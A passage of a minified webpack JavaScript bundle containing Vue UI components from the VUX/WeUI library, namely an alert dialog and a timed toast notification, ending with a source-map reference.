0!==this.value&&(this.showValue=this.value)},props:{value:Boolean,title:String,content:String,buttonText:String,hideOnBlur:{type:Boolean,default:!1},maskTransition:{type:String,default:"vux-mask"},dialogTransition:{type:String,default:"vux-dialog"},maskZIndex:[Number,String]},data:function(){return{showValue:!1}},methods:{_onHide:function(){this.showValue=!1}},watch:{value:function(t){this.showValue=t},showValue:function(t){this.$emit("input",t)}}}),n={render:function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{staticClass:"vux-alert"},[i("x-dialog",{attrs:{"mask-transition":t.maskTransition,"dialog-transition":t.dialogTransition,"hide-on-blur":t.hideOnBlur,"mask-z-index":t.maskZIndex},on:{"on-hide":function(e){t.$emit("on-hide")},"on-show":function(e){t.$emit("on-show")}},model:{value:t.showValue,callback:function(e){t.showValue=e},expression:"showValue"}},[i("div",{staticClass:"weui-dialog__hd"},[i("strong",{staticClass:"weui-dialog__title"},[t._v(t._s(t.title))])]),t._v(" "),i("div",{staticClass:"weui-dialog__bd"},[t._t("default",[i("div",{domProps:{innerHTML:t._s(t.content)}})])],2),t._v(" "),i("div",{staticClass:"weui-dialog__ft"},[i("a",{staticClass:"weui-dialog__btn weui-dialog__btn_primary",attrs:{href:"javascript:;"},on:{click:t._onHide}},[t._v(t._s(t.buttonText||"确定"))])])])],1)},staticRenderFns:[]};var o=i("VU/8")(s,n,!1,function(t){i("kp3f")},null,null);e.a=o.exports},rLAy:function(t,e,i){"use strict";var a=i("xNvf"),s=(a.a,Boolean,Number,String,String,String,Boolean,String,String,{name:"toast",mixins:[a.a],props:{value:Boolean,time:{type:Number,default:2e3},type:{type:String,default:"success"},transition:String,width:{type:String,default:"7.6em"},isShowMask:{type:Boolean,default:!1},text:String,position:String},data:function(){return{show:!1}},created:function(){this.value&&(this.show=!0)},computed:{currentTransition:function(){return this.transition?this.transition:"top"===this.position?"vux-slide-from-top":"bottom"===this.position?"vux-slide-from-bottom":"vux-fade"},toastClass:function(){return{"weui-toast_forbidden":"warn"===this.type,"weui-toast_cancel":"cancel"===this.type,"weui-toast_success":"success"===this.type,"weui-toast_text":"text"===this.type,"vux-toast-top":"top"===this.position,"vux-toast-bottom":"bottom"===this.position,"vux-toast-middle":"middle"===this.position}},style:function(){if("text"===this.type&&"auto"===this.width)return{padding:"10px"}}},watch:{show:function(t){var e=this;t&&(this.$emit("input",!0),this.$emit("on-show"),this.fixSafariOverflowScrolling("auto"),clearTimeout(this.timeout),this.timeout=setTimeout(function(){e.show=!1,e.$emit("input",!1),e.$emit("on-hide"),e.fixSafariOverflowScrolling("touch")},this.time))},value:function(t){this.show=t}}}),n={render:function(){var t=this,e=t.$createElement,i=t._self._c||e;return i("div",{staticClass:"vux-toast"},[i("div",{directives:[{name:"show",rawName:"v-show",value:t.isShowMask&&t.show,expression:"isShowMask && show"}],staticClass:"weui-mask_transparent"}),t._v(" "),i("transition",{attrs:{name:t.currentTransition}},[i("div",{directives:[{name:"show",rawName:"v-show",value:t.show,expression:"show"}],staticClass:"weui-toast",class:t.toastClass,style:{width:t.width}},[i("i",{directives:[{name:"show",rawName:"v-show",value:"text"!==t.type,expression:"type !== 'text'"}],staticClass:"weui-icon-success-no-circle weui-icon_toast"}),t._v(" "),t.text?i("p",{staticClass:"weui-toast__content",style:t.style,domProps:{innerHTML:t._s(t.text)}}):i("p",{staticClass:"weui-toast__content",style:t.style},[t._t("default")],2)])])],1)},staticRenderFns:[]};var o=i("VU/8")(s,n,!1,function(t){i("0nrA")},null,null);e.a=o.exports},rbuh:function(t,e){},wGEc:function(t,e){},z3SG:function(t,e){}},["NHnr"]);
//# sourceMappingURL=app.f8b85ac00cbf7bf9b392.js.map